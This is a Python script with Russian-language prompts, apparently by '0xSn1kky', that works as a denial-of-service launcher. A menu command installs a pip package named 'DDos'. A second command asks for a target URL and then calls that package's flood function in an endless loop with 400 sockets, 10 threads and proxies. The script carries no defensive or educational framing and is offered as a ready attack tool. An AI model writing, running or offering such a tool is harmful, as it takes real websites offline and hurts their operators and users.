import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)
import time
def clear ():
    print("\n" * 200)
print("""
<------------------------>
| Создатель кода: 0xSn1kky
| Версия: 1.0
<------------------------>
""")
print("Загрузка команд...")
time.sleep(1)
print("""
    [Список команд]
    1. /download - установка (Обязательно)
    2. /start - начать DDos
    3. /stop - выйти (не работает во время DDos атаки используйте Ctrl+Z)
    """)
command = input("Введите команду\n")

if command == "/download":
    import os
    os.system("pip install DDos")

if command == "/stop":
    clear()
    print("Пока")
    exit(0)
   
if command == "/start":
    try:
            import DDos
    except:
        print("Вы не установили напишите /download")
        exit(0)
    print("Введите ссылку")
    url = input("\n")
    while True:
      DDos.DDos(url, sockets = 400, threads = 10, use_proxies = True)
       
else:
    print("Команда не найдена!")
